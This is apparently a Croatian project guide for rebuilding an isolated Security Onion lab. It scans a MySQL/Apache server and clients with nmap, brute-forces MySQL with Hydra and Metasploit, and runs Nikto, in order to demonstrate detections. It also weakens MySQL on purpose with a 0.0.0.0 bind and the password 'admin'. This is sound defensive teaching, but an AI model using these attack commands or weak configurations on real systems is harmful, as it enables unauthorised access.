# Setup - rekreacija laboratorija

Ovaj dokument opisuje kako od nule rekreirati lab okruženje korišteno u projektu _Continuous Cybersecurity Threat Monitoring_. Cilj je da netko drugi, uz ovaj dokument i konfiguracijske datoteke u repozitoriju, može ponoviti sve ključne korake: postavljanje virtualnog okruženja, instalaciju operacijskih sustava, konfiguraciju servisa, generiranje prometa i napada, promatranje detekcija u Security Onionu te izrada sučelja i alerta.

## 1. Preduvjeti

Prije početka potrebno je:

- Host računalo s dovoljno resursa:

| Specifikacija | Minimalni zahtjevi | Preporučeni zahtjevi |
|--------------|-------------------|----------------------|
| CPU          | 8 jezgri / 16 dretvi (Intel i7 / Ryzen 7) | 12–16 jezgri / 24–32 dretve |
| RAM          | 16 GB             | 32 GB                |
| Pohrana     | 500 GB SSD        | 1 TB NVMe SSD        |

-   Instaliran **VirtualBox**
-   Preuzete ISO datoteke:
    -   Security Onion 2.4.190 - https://securityonionsolutions.com/software
    -   Ubuntu Desktop 24.04.3 LTS - https://ubuntu.com/download/desktop
    -   Ubuntu Server 24.04.3 LTS - https://ubuntu.com/download/server
    -   Kali Linux 2025.4 (installer images verzija) - https://www.kali.org/get-kali/

ISO datoteke smjesti u jedan direktorij radi lakšeg odabira tijekom kreiranja VM‑ova.

## 2. Mrežna topologija i VirtualBox

Lab koristi dvije logičke mreže:

-   **Management / monitoring mreža** – npr. `192.168.100.0/24`

    -   Security Onion
    -   Monitoring VM (Ubuntu Desktop, pristup sučelju Security Oniona)

-   **Interna lab mreža** – npr. `192.168.200.0/24`
    -   Attack VM (Kali)
    -   Server (Ubuntu Server, MySQL + Apache)
    -   Client 1 (Ubuntu Desktop)
    -   Client 2 (Ubuntu Desktop)

Tipične IP adrese korištene u projektu:

-   Security Onion – `192.168.100.3`
-   Monitoring VM – `192.168.100.4`
-   Attack VM – `192.168.200.10`
-   Server – `192.168.200.20`
-   Client 1 – `192.168.200.21`
-   Client 2 – `192.168.200.22`

![Arhitehtura mreže](../results/screenshots/konfiguracija%20mreže%20i%20VM-ova/Arhitektura%20mreže.png)

### 2.1. VirtualBox mreže

1. U _VirtualBox Network Manageru_ kreiraj **NAT** mrežu (npr. `SO-NAT`) s IPv4 adresom `192.168.100.0/24` te uključi DHCP.
2. Kao internu lab mrežu koristi **Internal Network** (npr. naziv `INT-NET`) – nije je potrebno posebno kreirati, samo odabrati isti naziv na svim VM‑ovima (detaljnije opisano u sljedećem poglavlju).

> NAPOMENA
>
> U slučaju da ne vidite tab _Network_ u VirtualBox Manageru potrebno je uključiti _Expert_ mod
>
> _File_ → _Preferences_ → _Expert_

### 2.2. Kreiranje VM‑ova i adaptera

Za svaku VM:

-   _New_ → odaberi ime i ISO image (Security Onion, Ubuntu Desktop/Server, Kali).
-   Isključi _Unattended Installation_
-   Dodijeli RAM i broj CPU jezgri
    -   Za Security Onion 8192MB RAM i 6 CPU jezgri
    -   Za sve ostale VM-ove 2048MB RAM i 2 CPU jezgre
-   Dodijeliti veličinu diska - Za Security Onion 200GB - Za Server 30GB - Za sve ostale VM-ove 25GB

> U ovom projektu su korištene minimalne preporučene veličine iz službenih dokumentacija korištenih operacijskih sustava, ukoliko imate dovoljno resursa konfiguracija se može i povećati.

Mrežni adapteri:

-   **Security Onion**
    -   Adapter 1: NAT Network (`SO-NAT`) → _Promiscuous Mode_ postavljen na `Deny`
    -   Adapter 2: Internal Network (`INT-NET`) → _Promiscuous Mode_ postavljen na `Allow All`
-   **Monitoring VM**
    -   Adapter 1: NAT Network (`SO-NAT`) → _Promiscuous Mode_ postavljen na `Deny`
-   **Attack VM (Kali)**
    -   Adapter 1: Internal Network (`INT-NET`) → _Promiscuous Mode_ postavljen na `Deny`
-   **Server (Ubuntu Server)**
    -   Adapter 1: Internal Network (`INT-NET`) → _Promiscuous Mode_ postavljen na `Deny`
-   **Client 1 / Client 2**
    -   Adapter 1: Internal Network (`INT-NET`) → _Promiscuous Mode_ postavljen na `Deny`

> Po potrebi može se privremeno dodati i Adapter 2 postavljen na NAT za VM-ove koji imaju isključivo internu mrežu u svrhe ažuriranja i instalacije potrebnih paketa, ali kod generiranja prometa je obavezno potrebno isključiti iste.
>
> Prilikom prvog pokretanja i instalacije operacijskih sustava i servera preporuka je uključiti NAT na drugom adapteru kako bi se mogli preuzeti svi paketi.

> Detaljni screenshotovi VirtualBox mrežnih postavki nalaze se u
> [results/screenshots/konfiguracija mreže i VM-ova/](../results/screenshots/konfiguracija%20mreže%20i%20VM-ova).

## 3. Instalacija operacijskih sustava

### 3.1. Security Onion

1. Pokreni VM sa Security Onion ISO‑om i prati instalacijski čarobnjak (potrebno unijeti korisničko ime i lozinku za pristup Security Onion-u).
2. Nakon restarta i prijave pomoću prethodno definiranog profila pokreće se Security Onion Setup:
    - Odaberi opciju _Install_
    - Odaberi _EVAL_ način rada (najbolje za laboratorije)
    - Odaberi opciju _Standard_
    - Definiraj naziv za hostname (`soc`)
    - Odaberi koji će se adapter koristiti za management → odaberi prvi adapter (`enp0s3`) → to je NAT-Network adapter koji smo prethodno postavili u konfiguraciji VM-a
    - Odaberi _DHCP_ za konfiguraciju sučelja → time će sučelje automatski dobiti IP adresu iz NAT mreže (`102.168.100.X`)
    - Odaberi _Direct_ način pristupa internetu
    - Odaberi _Yes_ za Docker IP range
    - Odaberi koji će se adapter koristiti za monitoring → odaberi drugi adapter (`enp0s8`) → to je Internal Network adapter koji smo prethodno postavili u konfiguraciji VM-a
    - Unesi mail kojim ćes pristupiti sučelju (`sis@gmail.com`) → ne mora biti stvarno kreiran mail
    - Unesi lozinku za pristup sučelju
    - Odaberi _IP_ za način pristupa sučelju Security Oniona
    - Odaberi _Yes_ za davanje pristupa Security Onionu putem web sučelja
    - Unesi IP adresu ili raspon IP adresa koje će imati pristup sučelju (`192.168.100.0/24`)
    - Odaberi želiš li uključiti SOC Telemetry (opcionalno)
    - Provjeri konačne postavke i potvrdi instalaciju kako bi se započela instalacija Security Oniona

![Konačne postavke Security Oniona](../results/screenshots/konfiguracija%20mreže%20i%20VM-ova/Security%20Onion%20setup.png)

### 3.2. Monitoring VM

1. Pokreni Monitoring VM sa Ubuntu Desktop ISO‑om i prati instalacijski čarobnjak (proces je izrazito jednostavan pa detaljniji koraci nisu potrebni).
2. Nakon instalacije OS-a i reboota VM-a napravi ažuriranje svih paketa:
    ```PowerShell
    sudo apt update
    sudo apt upgrade -y
    ```

### 3.3. Ubuntu Server – MySQL i Apache server

1. Dodaj Adapter 2 na VM sa Ubuntu Server ISO-om postavljen na NAT kako bi imao pristup internetu kod instalacije servera te instalacije potrebnih paketa.
2. Pokreni VM sa Ubuntu Server ISO‑om i prati instalacijski čarobnjak:
    - Za bazu odaberi _Ubuntu Server_ i nemoj uključivati _Search for third-party drivers_
    - Kod liste adaptera nemoj ništa mijenjati → provjeri da je Adapter 2 (`enp0s8`) definiran s DHCP i postavljenom IP adresom
    - Nemoj koristiti proxy server
    - Mirror adresu ostavi default
    - Odaberi opciju _Use an entire disk_ kao bise koristio čitav disk kod instalacije → _Set up this disk as an LVM group_ ostavi uključeno i nemoj uključivati enkripciju
    - Koristi zadanu shemu `/` i `/boot` te samo nastavi dalje
    - Kreiraj korisnika kojim ćeš pristupiti serveru prilikom pokretanja
    - Preskoči upgrade na Ubuntu PRO
    - Označi _Install OpenSSH server_ → ostavi uključeno _Allow password authentication over SSH_ → ovime će se instalirati SSH servis na serveru koji također može biti jedna od meta za napade
    - Ostavi neoznačene sve opcije za instalaciju snap paketa
3. Pričekaj da se instalacija servera završi te napravi reboot.
4. Nakon prijave napravi ažuriranje svih paketa
    ```PowerShell
    sudo apt update
    sudo apt upgrade -y
    ```
5. Prije svega potrebno je namjestiti statičku IP adresu za server na sljedeći način:

    ```PowerShell
    sudo nano /etc/netplan/50-cloud-init.yaml
    ```

    - Zamijeni postojeći sadržaj na način da izgleda otprilike ovako:

        ```text
        network:
        version: 2
        ethernets:
            enp0s3:
            addresses:
                - 192.168.200.20/24
            enp0s8:
            dhcp4: true
        ```

    - Spremi i primijeni novi plan te provjeri jesu li promjene izvršene:

        ```PowerShell
        sudo netplan apply
        ```

    - Provjeri da enp0s3 interface ima prethodno postavljenu IP adresu:
        ```PowerShell
        sudo netplan apply
        ```

6. Instaliraj Apache web poslužitelj i MySQL servera
    ```PowerShell
    sudo apt install -y apache2
    sudo apt install -y mysql-server
    ```
    - Ovime će se instalirati Apache servis na portu `80` (default) te MySQL servis na portu `3306` (default)
    - Po defaultu port za Apache servis je otvoren, ali za MySQL servis nije, pa ga je potrebno otvorit na sljedeći način:
        ```PowerShell
        sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
        ```
        - Nađi linije:
            ```text
            bind-address            = 127.0.0.1
            mysqlx-bind-address     = 127.0.0.1
            ```
        - Promijeni u:
            ```text
            bind-address            = 0.0.0.0
            mysqlx-bind-address     = 0.0.0.0
            ```
        - Zatim resetiraj MySQL servis:
            ```PowerShell
            sudo systemctl restart mysql
            ```

### 3.4. Ubuntu Desktop – klijenti

1. Dodaj Adapter 2 na Client VM sa Ubuntu Desktop ISO-om postavljen na NAT kako bi imao pristup internetu kod instalacije OS-a te instalacije potrebnih paketa.
2. Pokreni VM sa Ubuntu Desktop ISO‑om i prati instalacijski čarobnjak (proces je izrazito jednostavan pa detaljniji koraci nisu potrebni).
3. Nakon instalacije OS-a i reboota VM-a napravi ažuriranje svih paketa:
    ```PowerShell
    sudo apt update
    sudo apt upgrade -y
    ```
4. Ugasiti VM te isključiti Adapter 2 kako bi se sklonio pristup internetu te nakon toga ponovno pokrenuti VM.
5. Namjesti statičku IP adresu za klijenta na sljedeći način:

    ```PowerShell
    sudo nano /etc/netplan/01-network-manager-all.yaml
    ```

    - Zamijeni postojeći sadržaj na način da izgleda otprilike ovako:

        ```text
        network:
        version: 2
        renderer: NetworkManager
        ethernets:
            enp0s3:
            addresses:
                - 192.168.200.21/24
        ```

        > Za klijenta 1 koristiti `192.168.200.21/24`, a za klijenta 2 koristiti `192.168.200.22/24`

    - Spremi i primijeni novi plan te provjeri jesu li promjene izvršene:

        ```PowerShell
        sudo netplan apply
        ```

    - Provjeri da enp0s3 interface ima prethodno postavljenu IP adresu:
        ```PowerShell
        ip a
        ```

### 3.6. Kali Linux – Attack VM

1. Dodaj Adapter 2 na Attack VM sa Kali Linux ISO-om postavljen na NAT kako bi imao pristup internetu kod instalacije OS-a te instalacije potrebnih paketa.
2. Pokreni VM sa Kali Linux ISO‑om i prati instalacijski čarobnjak (proces je izrazito jednostavan pa detaljniji koraci nisu potrebni).
3. Nakon instalacije OS-a i reboota VM-a napravi ažuriranje svih paketa:
    ```PowerShell
    sudo apt update
    sudo apt upgrade -y
    ```
4. Ugasiti VM te isključiti Adapter 2 kako bi se sklonio pristup internetu te nakon toga ponovno pokrenuti VM.
5. Namjesti statičku IP adresu za napadača na sljedeći način:
    - U start meniju pronađi _Advanced Network Configuration_
    - Odaberi _Wired connection 1_ te pritisni na ikonu postavki
    - Na kartici _IPv4 Settings_ odaberi method `Manual`
    - Odaberi _Add_ i dodaj novu adresu sa sljedećim postavkama:
        - Address: `192.168.200.10`
        - Netmask: `24`
    - Spremi promjene i provjeri da eth0 interface ima prethodno postavljenu IP adresu:
        ```PowerShell
        ip a
        ```

## 4. Konfiguracija Security Oniona i Suricate

1. Pokreni Security Onion i prijavi se u web sučelje (SOC) s Monitoring VM‑a preko browsera koristeći IP adresu dobivenu kod pokretanja Security Oniona (`https://192.168.100.3/`).
2. Provjeri da Suricata senzori rade → u tabu _Grid_ pričekaj da status procesa bude `OK`.
3. Pokreni Attack VM i Server VM te kroz terminal pokreni jednostavan scan porta koristeći `nmap` na sljedeći način:
    ```PowerShell
    nmap 192.168.200.20
    ```
4. U tabu _Detections_ sučelja Security Onion trebali bi se pojaviti alerti za provedeno skeniranje porta (`ET SCAN ...`).
5. Time je provjereno nadzire li se promet, sama konfiguracija je već po defaultu napravljena kod instalacije Security Oniona, za potrebe projekta ili u produkciji moguće je kreirati dodatna pravila u tabu _Detections_.

## 5. Generiranje prometa za demonstraciju nadziranja Security Oniona

U nastavku slijede upute za generiranje prometa kojim će se demonstrirati nadziranje Security Oniona. Promet je podjeljen na normalan promet (slanje običnih paketa) koje Security Onion neće detektirati jer ne predstavljaju sigurnosni rizik i maliciozni odnosno napadački promet (skeniranje mete, brute-force napadi) koje će Security Onion detektirati kao prijetnju.

Za generiranje prometa potrebno je ukupno 6 virutalnih strojeva, no preporuka je da ne budu svi istovremeno upaljeni kako se ne bi preopteretila RAM memorija računala te kako bi računalo moglo normalno raditi. Ono što je važno je da stroj koji pokreće Security Onion i Ubuntu sustav za nadzor prometa (monitoring) budu uvijek uključeni. Strojevi za napad i normalan promet se pale po potrebi te se gase kada nisu potrebni kako vi se poboljšale performanse.

Za početak je potrebno na strojevima koji predstavljaju obične korisnike instalirati alat iperf3 i mysql kako bi se mogli spojiti na mysql server.

### 5.1. Instaliranje iperf3 i mysql na klijentima (običnim korisnicima)

1. U virtualboxu u stroju Client 1 VM i Client 2 VM uključiti NAT mrežni adapter.

![Uključivanje NAT mrežnog adaptera](../results/screenshots/generiranje%20prometa/Ukljucivanje%20NAT%20adaptera%20za%20Client%201%20i%202%20VM.png)

1. Upaliti strojeve i u terminalu provjeriti jesu li instalirani mysql i iperf3.

```bash
mysql --version
iperf3 --version
```
![Alati iperf3 i mysql nisu instalirani](../results/screenshots/generiranje%20prometa/mysql%20iperf3%20--version%20ne%20instalirani.png)

Ukoliko se ne ispišu podaci o verzijama, potrebno je instalirati oba alata naredbama:

```bash
sudo apt install -y mysql-client
sudo apt install -y iperf3
```

![Alati iperf3 i mysql instalirani](../results/screenshots/generiranje%20prometa/mysql%20iperf3%20--version%20instalirani.png)

Još jednom s `mysql --version` i `iperf3 --version` provjeriti da li je instalacija uspješna.

Kada su oba alata instalirana potrebno je izgasiti oba stroja te isključiti NAT mrežni priključak prije generiranja prometa. Postupak isključivanja identičan je postupku uključivanja samo se NAT mrežni priključak treba odznačiti.

---

### 5.2. Generiranje normalnog prometa

U nastavku slijede upute za generiranje normalnog prometa. Svrha je demonstrirati da Security Onion neće detektirati te pakete kao rizične za sigurnost računala domaćina. Sve naredbe za normalni promet mogu se generirati odjednom, a mogu se generirati i između napadačkih, no preporuka je ukoliko korisnik ne posjeduje preporučene hardwareske zahtjeve za projekt (32 GB RAM memorije) da prvo generira normalan promet između VM1 i VM2 pa zatim samo napadački, kako ne bi više strojeva radilo istovremeno.

Za svaku naredbu je definirano s kojeg stroja se upisuje u terminal, pa ako piše `VM1: <naredba>` znači da se naredba pokreće sa stroja koji predstavlja običnog korisnika 1, odnosno sa stroja Client1, a ukoliko stoji `VM2: <naredba>` to znači da se naredba pokreće s običnog korisnika 2, odnosno sa stroja Client2. Ukoliko piše `SERVER: <naredba>` to znači da se naredba pokreće sa mysql servera, odnosno sa Server VM stroja.

U nastavku slijede samo naredbe, a njihovo detaljno objašnjenje može se pronaći u dokumentaciji.

#### VM 1

```bash
ping -c 20 192.168.200.22
```

#### VM 2

```bash
ping -c 20 192.168.200.21
```

#### VM 2

```bash
iperf3 -s
```

#### VM 1

```bash
iperf3 -c 192.168.200.22
iperf3 -c 192.168.200.22 -t 30 -P 4
iperf3 -c 192.168.200.22 -t 30 -R
iperf3 -c 192.168.200.22 -u -b 10M -t 30
```

#### VM 2

```bash
dd if=/dev/urandom of=/tmp/testfile.bin bs=1M count=50
cd /tmp
python3 -m http.server 8080
```

(output bi trebao biti `Serving HTTP on 0.0.0.0 port 8080`)

#### VM 1

```bash
wget http://192.168.200.22:8080/testfile.bin -O /tmp/testfile.bin
for i in 1 2 3; do wget http://192.168.200.22:8080/testfile.bin -O /dev/null; done
```

---

#### Promet prema serveru

Ugasiti VM2, a pokrenuti server te se prijaviti sa korisničkim imenom „server“ i lozinkom „admin“. VM1 ostaviti pokrenutog.

#### SERVER

```bash
sudo systemctl status mysql
```

- unesti lozinku „admin“, naredbom se provjerava da li je server pokrenut ili zaustavljen, postoje li greške i sl.

![Rezultat naredbe sudo systemctl status mysql](../results/screenshots/generiranje%20prometa/sudo%20systemctl%20status%20mysql.png)
#### VM 1

```bash
mysql -h 192.168.200.20 -u client1 -p
```

- unesti lozinku „admin“, prikazat će se `mysql>`

```sql
SHOW DATABASES;
USE mysql;
SELECT User, Host FROM user;
SELECT COUNT(*) FROM user;
SELECT * FROM mysql.user;
```

Sada je generiran sav normalan promet, može se uočiti da Secirity Onion bez obzira na veličinu paketa nije detektirao ništa osim ping naredbe koja provjerava da li je domaćin odnosno VM aktivan te se koristi u svrhu skeniranja mete ili za napad uskraćivanja usluge (eng. Denial of service, u nastavku akronim DoS), a Suricata ima ugrađena pravila za detekciju takvog prometa.

---

### 5.3. Napadački promet

Sve naredbe za napadački promet su kao i za normalan detaljno objašnjenje i u dokumentaciji te se ona također može koristiti za provedbu projekta.

Ugasiti VM2, a upaliti stroj koji predstavlja napadača, odnosno Attack VM. VM1 i Server Ukoliko je moguće ostaviti i VM1 i Server VM istovremeno pokrenute, napad se izvodi samo jednom naredbom odnosno skriptom koja pokreće sve ostale naredbe. Ukoliko nije moguće, prvo se napada Server VM, a zatim VM1, pa se VM1 može isključiti.

Prvo je potrebno provjeriti postoji li datoteka rockyou.txt.

#### Attack

```bash
ls /usr/share/wordlists/
```

- Ukoliko se u rezultatu ispiše `rockyou.txt.gz`, to znači da je potrebno raspakirati datoteku

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

Datoteka rockyou.txt sadrži listu poznatih lozinki, odnosno velike količine često korištenih riječi za lozinke te će se koristiti u automatiziranim Brute-Force napadima.

Alati Hydra, Metasploit i Nikto trebali bi biti predinstalirani na Kali distribucijama Linuxa.

#### Attack

```bash
which hydra
which msfconsole
which nikto
```

Ukoliko su alati instalirani, rezultat naredbi bi trebao biti jednak rezultatu sa sljedeće slike:
![Alati hydra, msfconsole, nikto instalirani](../results/screenshots/generiranje%20prometa/which%20hydra%20msfconsole%20nikto.png)

Ukoliko alati nisu predinstalirani (što nebi trebao biti slučaj osim ako ih korisnik nije sam ručno deinstalirao) potrebno ih je instalirati:
```bash
sudo apt update
sudo apt install hydra metasploit-framework nikto
```

Provjeriti s `which hydra`, `which msfconsole` i `which nikto` jesu li alati uspiješno instalirani.

#### Attack (pričekati da se svako skeniranje izvrši do kraja, pa pokrenuti sljedeće):

```bash
nmap -sn 192.168.200.20
nmap -sS 192.168.200.20
nmap -sU --top-ports 10 192.168.200.20
nmap -sS -p 3306 192.168.200.20
nmap -sV -p 3306 192.168.200.20
nmap --script=mysql-info 192.168.200.20
nmap -O 192.168.200.20
nmap -A 192.168.200.20
nmap -sS -T5 --max-retries 1 --min-rate 500 192.168.200.20
```
Ručni bruteforce pokušaj prijave:
```bash
mysql -h 192.168.200.20 -u user1234 -p
```

`Enter password:`
```
krivalozinka1
```

```bash
mysql -h 192.168.200.20 -u user1234 -p
```

`Enter password:`
```
krivalozinka2
```

Brute force napadi provode se korištenjem alata kao Hidra ili Metasploit koji automatiziraju napad.
#### 5.2.1. HIDRA

#### Attack:
```bash
hydra -l client1 -P /usr/share/wordlists/rockyou.txt mysql://192.168.200.20
```

- probati se spojiti nakon uspiješnog napada

```bash
mysql -h 192.168.200.20 -P 3306 -u client1 -p --ssl=0
```

Enter password:
```
admin
```

```sql
SHOW DATABASES;
USE mysql;
exit;
```

#### 5.2.2. METASPLOIT

#### Attack:
```text
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.200.20
set RPORT 3306
set USERNAME client1
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

use auxiliary/admin/mysql/mysql_enum
set RHOSTS 192.168.200.20
set RPORT 3306
set USERNAME client1
set PASSWORD tvoja_lozinka
run
```

#### 5.2.3. NIKTO

#### Attack:
```bash
nikto -h http://192.168.200.20
```

---

#### 5.3. Napad na Client 1 VM

Nakon napada na server, Server VM stroj se može isključiti te je potrebno uključiti Client 1 VM. Sada će se s Attack VM generirati maliciozni promet prema Client 1 VM. Nakon što se Client 1 VM pokrene potrebno je unijeti sljedeće naredbe.

#### Attack:

```bash
nmap -sn 192.168.200.21
nmap -sS 192.168.200.21
nmap -sU --top-ports 10 192.168.200.21
nmap -sS -T5 --min-rate 500 192.168.200.21
```

---

### 5.4. Automatizacija napada skriptom

Ukoliko korisnik može istovremeno pokrenuti Server VM i Client1 VM, a ne zanimaju ga previše detalji oko napada, može kreirati skriptu kojom će izvršiti sve napade.

#### Upute za kreiranje skripte

#### Attack:

1. Kreirati praznu `.sh` (shell script) datoteku.

```bash
nano attack_traffic.sh
```

2. Zalijepiti u datoteku:

```bash
#!/bin/bash
echo "[*] Pokretanje skripte napada"

# TARGET 192.168.200.20
nmap -sn 192.168.200.20
nmap -sS 192.168.200.20
nmap -sU --top-ports 10 192.168.200.20
nmap -sS -p 3306 192.168.200.20
nmap -sV -p 3306 192.168.200.20
nmap --script=mysql-info 192.168.200.20
nmap -O 192.168.200.20
nmap -A 192.168.200.20
nmap -sS -T5 --max-retries 1 --min-rate 500 192.168.200.20

hydra -l client1 -P /usr/share/wordlists/rockyou.txt mysql://192.168.200.20

msfconsole -q -r mysql_attack_20.rc

nikto -h http://192.168.200.20

# TARGET 192.168.200.21
nmap -sn 192.168.200.21
nmap -sS 192.168.200.21
nmap -sU --top-ports 10 192.168.200.21
nmap -sS -T5 --min-rate 500 192.168.200.21

echo "[*] Kraj skripte"
```

3. Spremiti i izaći  
`Ctrl+O → Enter → Ctrl+X`

4. Kreirati `.rc` (resource file) datoteku s podacima koji se koriste u METASPLOIT napadu.

```bash
nano mysql_attack_20.rc
```

Zalijepiti u datoteku:

```text
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.200.20
set RPORT 3306
set USERNAME client1
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

use auxiliary/admin/mysql/mysql_enum
set RHOSTS 192.168.200.20
set RPORT 3306
set USERNAME client1
set PASSWORD tvoja_lozinka
run
exit
```

5. Spremiti i izaći  
`Ctrl+O → Enter → Ctrl+X`

6. Promijeniti prava skripte tako da se može izvršavati.

```bash
chmod +x attack_traffic.sh
```

7. Pokrenuti skriptu

```bash
sudo ./attack_traffic.sh
```

Sada će se sav napadački promet generirati odjednom, bez potrebe da se ručno unose naredbe.

Za dodatno objašnjenje naredbi preporučeno je pročitati dokumentaciju u kojoj se nalaze slike iz terminala i rezultat kako Security Onion detektira svaku naredbu kojom se generira promet.
